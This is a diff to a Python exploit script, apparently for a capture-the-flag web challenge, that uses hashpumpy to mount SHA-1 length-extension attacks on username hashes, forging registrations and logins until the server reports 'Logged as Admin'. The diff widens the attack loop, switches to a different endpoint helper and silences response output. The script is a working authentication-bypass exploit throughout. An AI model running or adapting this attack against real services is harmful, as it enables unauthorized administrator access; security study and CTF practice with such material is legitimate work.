@@ -5,7 +5,7 @@ import urllib.parse
 import string
 import chardet
 
-from functions import stick_register, stick_login, stick_member
+from functions import stick_register, stick_login, stick_member, stick_note
 
 # PROVEN KEY LENGTH IS 16 (128 bits)
 KEY_LEN = 16
@@ -34,7 +34,7 @@ def main():
         'cf0b865de23ec929ac6112edf0eb90d3c5a32107', # adm
         '4dd28ad0560441245de6fda3973890eeb41b702d', # admi
     ]
-    for i in range(1, 4):
+    for i in range(1, 5):
         data = list(hashpumpy.hashpump(hashes[i-1], username[:i], username[i:], KEY_LEN))
         data.append(i)
         data.append(username[:i])
@@ -48,7 +48,7 @@ def main():
         print("[{}] {} => {}".format(r[2], r[0], register_user))
         print(register_user)
 
-        status, data = stick_member(register_user, r[0], prefix=r[3])
+        status, data = stick_note(register_user, r[0], prefix=r[3])
         
 
         print("[{}] Code: {}".format(r[2], status))
@@ -70,8 +70,7 @@ def main():
                     print("[{}] OK: Registered".format(r[2]))
                 elif resp.find('Welcome') > 0:
                     print("[{}] OK: Logged as Admin".format(r[2]))
-                    print(resp)
-                    break
+                    #print(resp)
                 elif resp.find('email or password empty'):
                     print("[{}] KO: Hash doesn't work".format(r[2]))
                 else:
